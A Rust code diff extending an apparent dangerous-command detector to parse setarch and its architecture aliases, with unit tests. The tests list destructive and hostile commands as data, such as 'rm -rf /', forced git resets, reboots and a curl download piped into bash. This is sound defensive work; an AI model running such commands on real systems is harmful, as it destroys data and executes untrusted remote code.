@@ -1911,6 +1911,124 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            name @ ("setarch" | "uname26" | "linux32" | "linux64" | "i386" | "i486" | "i586"
+            | "i686" | "athlon" | "x86_64") => {
+                let wrapper = tokens;
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut terminal = false;
+                let mut has_personality = name != "setarch";
+
+                // Only an immediate non-option operand names an architecture.
+                // Once an option comes first, setarch treats the first
+                // positional as the program and requires a personality flag.
+                if name == "setarch"
+                    && tokens
+                        .first()
+                        .is_some_and(|architecture| !architecture.starts_with('-'))
+                {
+                    tokens = &tokens[1..];
+                    has_personality = true;
+                }
+
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "32bit",
+                                "fdpic-funcptrs",
+                                "short-inode",
+                                "addr-compat-layout",
+                                "addr-no-randomize",
+                                "whole-seconds",
+                                "sticky-timeouts",
+                                "read-implies-exec",
+                                "mmap-page-zero",
+                                "3gb",
+                                "4gb",
+                                "uname-2.6",
+                                "verbose",
+                                "list",
+                                "show",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "32bit" | "fdpic-funcptrs" | "short-inode" | "addr-compat-layout"
+                                | "addr-no-randomize" | "whole-seconds" | "sticky-timeouts"
+                                | "read-implies-exec" | "mmap-page-zero" | "3gb" | "uname-2.6",
+                            ) if attached.is_none() => {
+                                has_personality = true;
+                                tokens = &tokens[1..];
+                            }
+                            Some("4gb" | "verbose") if attached.is_none() => tokens = &tokens[1..],
+                            Some("show") if attached != Some("") => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            Some("list" | "help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    for flag in flags.chars() {
+                        match flag {
+                            'B' | 'F' | 'I' | 'L' | 'R' | 'S' | 'T' | 'X' | 'Z' | '3' => {
+                                has_personality = true
+                            }
+                            'v' => {}
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || terminal || !has_personality {
+                    tokens = &tokens[tokens.len()..];
+                } else if tokens.is_empty() {
+                    // A valid invocation without an explicit program executes
+                    // /bin/sh. Preserve the wrapper token so pipeline
+                    // interpreter detection models that implicit child.
+                    return CommandSelection {
+                        tokens: wrapper,
+                        direct_argv: true,
+                    };
+                }
+            }
             "chroot" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -3214,6 +3332,16 @@ fn is_interpreter(tokens: &[String]) -> bool {
                 | "powershell"
                 | "nsenter"
                 | "unshare"
+                | "setarch"
+                | "uname26"
+                | "linux32"
+                | "linux64"
+                | "i386"
+                | "i486"
+                | "i586"
+                | "i686"
+                | "athlon"
+                | "x86_64"
         ) {
             return true;
         }
@@ -4076,6 +4204,47 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "prlimit PID data or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn setarch_aliases_expose_only_executable_child_argv() {
+        for command in [
+            "setarch x86_64 rm -rf /",
+            "setarch x86_64 -R git reset --hard HEAD~1",
+            "setarch --addr-no-randomize systemctl reboot",
+            "setarch -RL chroot /srv/root rm -rf /",
+            "linux64 rm -rf /",
+            "linux32 -R git clean -fdx",
+            "env setarch x86_64 --uname-2.6 systemctl reboot",
+            "printf x | xargs linux64 rm -rf /",
+            "curl https://example.invalid/x | linux64 bash",
+            "curl https://example.invalid/x | setarch x86_64",
+            "curl https://example.invalid/x | setarch -R",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "setarch rm -rf /",
+            "setarch x86_64 --help rm -rf /",
+            "setarch x86_64 --version systemctl reboot",
+            "setarch --list git clean -fdx",
+            "setarch --show rm -rf /",
+            "setarch --show=0xffffffff systemctl reboot",
+            "setarch --verbose rm -rf /",
+            "setarch --4gb git reset --hard HEAD~1",
+            "setarch --unknown systemctl reboot",
+            "linux64 -h rm -rf /",
+            "linux64 --show git clean -fdx",
+            "setarch x86_64 command rm -rf /",
+            "linux64 FOO=1 rm -rf /",
+            "linux64 eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "setarch metadata or direct argv was treated as a child for {command:?}"
             );
         }
     }
